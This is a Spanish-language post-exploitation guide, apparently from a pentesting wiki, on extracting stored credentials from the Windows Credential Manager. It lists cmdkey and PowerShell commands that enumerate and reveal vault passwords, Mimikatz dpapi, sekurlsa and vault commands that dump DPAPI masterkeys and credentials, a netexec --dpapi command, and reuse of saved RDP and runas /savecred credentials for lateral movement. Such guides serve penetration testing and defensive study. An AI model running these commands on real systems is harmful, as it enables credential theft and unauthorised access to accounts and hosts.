# Credential Manager de Windows

El Credential Manager (Administrador de credenciales) es el almacén seguro de Windows donde se guardan credenciales de red, aplicaciones y sitios web. Permite que el sistema recuerde contraseñas para recursos de red (shares SMB, RDP, sitios web con autenticación básica) sin que el usuario las reintroduzca. Para un atacante con sesión activa, es una fuente de credenciales ya descifradas.

### Tipos de credenciales almacenadas

| Tipo                              | Descripción                                                                           |
| --------------------------------- | ------------------------------------------------------------------------------------- |
| **Windows Credentials**           | Credenciales para recursos de red: shares, RDP, NTLM                                  |
| **Certificate-Based Credentials** | Certificados para autenticación                                                       |
| **Generic Credentials**           | Aplicaciones de terceros: Office 365, Teams, clientes VPN, herramientas de desarrollo |
| **Web Credentials**               | Credenciales de Internet Explorer / Edge Legacy                                       |

Las credenciales se cifran con DPAPI (Data Protection API), vinculadas a la cuenta del usuario. Si se tiene acceso como ese usuario, se pueden descifrar.

### Enumeración desde CMD / PowerShell

```cmd
# Listar todas las credenciales almacenadas
cmdkey /list

# Salida típica:
# Currently stored credentials:
#   Target: Domain:interactive=EMPRESA\jsmith
#   Type: Domain Password
#   User: EMPRESA\jsmith
#
#   Target: MicrosoftOffice16_Data:SSPI:user@empresa.com
#   Type: Generic
#   User: user@empresa.com
```

```powershell
# Con PowerShell — más detalle
[Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType=WindowsRuntime]::new().RetrieveAll() | % { $_.RetrievePassword(); $_ }
```

### Extracción con Mimikatz

```
# Desde sesión con privilegios del usuario objetivo
dpapi::cred /in:C:\Users\jsmith\AppData\Local\Microsoft\Credentials\*
dpapi::masterkey /in:C:\Users\jsmith\AppData\Roaming\Microsoft\Protect\S-1-5-21-*\* /rpc
sekurlsa::dpapi      # extrae las masterkeys de LSASS para descifrar DPAPI
vault::cred          # vuelca Windows Vault
vault::list          # lista entradas del vault
```

### Extracción con netexec / CrackMapExec

```bash
netexec smb 192.168.1.10 -u admin -p Pass123 --dpapi
```

### Uso de credenciales RDP almacenadas

Si hay credenciales RDP almacenadas para otro host, se pueden usar directamente sin conocer la contraseña en texto claro:

```cmd
# Listar credenciales RDP guardadas
cmdkey /list | findstr "TERMSRV"

# Conectar usando la credencial almacenada (sin especificar contraseña)
mstsc /v:192.168.1.20   # usará la credencial guardada automáticamente
```

### Runat

`runas /savecred` también aprovecha el Credential Manager. Si hay entradas guardadas, se puede ejecutar comandos como otro usuario sin conocer su contraseña:

```cmd
runas /savecred /user:EMPRESA\admin "cmd.exe"
```

> &#x20;`runas /savecred` es una técnica clásica de elevación lateral que a menudo se pasa por alto. Si un administrador usó `/savecred` alguna vez, sus credenciales pueden estar accesibles para cualquier usuario del sistema.

> Durante post-exploitation, revisar siempre el Credential Manager de todos los usuarios que han iniciado sesión en el sistema. Las cuentas de administradores y técnicos de IT suelen tener guardadas credenciales de múltiples sistemas.
